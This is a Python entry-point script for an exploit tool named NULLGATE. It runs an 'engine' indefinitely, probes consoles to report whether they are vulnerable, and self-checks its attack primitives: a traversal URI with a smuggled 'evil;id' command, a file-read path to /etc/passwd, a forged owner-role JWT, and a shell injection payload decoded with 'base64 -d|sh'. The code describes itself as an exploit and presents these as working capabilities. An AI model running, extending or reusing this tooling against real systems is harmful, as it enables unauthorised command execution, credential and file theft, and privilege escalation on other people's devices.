#!/usr/bin/env python3
"""NULLGATE entry point.

Commands:
    engine      run the on-device engine (default)
    selftest    hardware-free engine smoke test
    capcheck    hardware-free transport/capability check
    probe HOST  non-destructive safe probe against one console
"""

from __future__ import annotations

import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)

from sd import __version__, attack, net  # noqa: E402
from sd.engine import run_forever, selftest  # noqa: E402


def capcheck():
    """Verify the stdlib primitives the exploit depends on, without a target."""
    checks = []
    try:
        ctx = net.unverified_context()
        checks.append(("ssl-context", ctx is not None))
    except Exception as exc:  # noqa: BLE001
        checks.append(("ssl-context", "FAIL: %s" % exc))
    path = net.bypass_path(params={"pkg_name": "evil;id", "by_cmd": "true"})
    checks.append(("verbatim-uri", path.startswith(net.TRAVERSAL) and
                   "..%2f" in path and "pkg_name=evil%3Bid" in path))
    checks.append(("file-read-path", "app-assets/users/" in
                   net.file_read_path("/etc/passwd")))
    token = attack.forge_token("secret",
                               claims={"role": "owner"})
    checks.append(("jwt-forge", token.count(".") == 2))
    script = attack.injection_payload("echo hi")
    checks.append(("injection-payload", script.startswith("evil;echo ") and
                   "|base64 -d|sh" in script))
    for name, result in checks:
        print("%s: %s" % (name, result if result is True else "FAIL %s" % result))
    ok = all(r is True for _, r in checks)
    print("capcheck: %s (NULLGATE %s)" % ("PASS" if ok else "FAIL", __version__))
    return 0 if ok else 1


def probe(host, port=net.DEFAULT_PORT):
    r = net.safe_probe(host, port)
    print("%s:%s -> %s" % (host, port, r["state"].upper()))
    print("  %s" % r["detail"])
    return 0 if r["state"] == "vulnerable" else 1


def main():
    cmd = sys.argv[1] if len(sys.argv) > 1 else "engine"
    if cmd == "selftest":
        selftest()
    elif cmd == "capcheck":
        return capcheck()
    elif cmd == "probe":
        if len(sys.argv) < 3:
            print("usage: nullgate.py probe HOST [PORT]", file=sys.stderr)
            return 2
        port = int(sys.argv[3]) if len(sys.argv) > 3 else net.DEFAULT_PORT
        return probe(sys.argv[2], port)
    elif cmd == "engine":
        run_forever()
    else:
        print("usage: nullgate.py [engine|selftest|capcheck|probe HOST]",
              file=sys.stderr)
        return 2
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
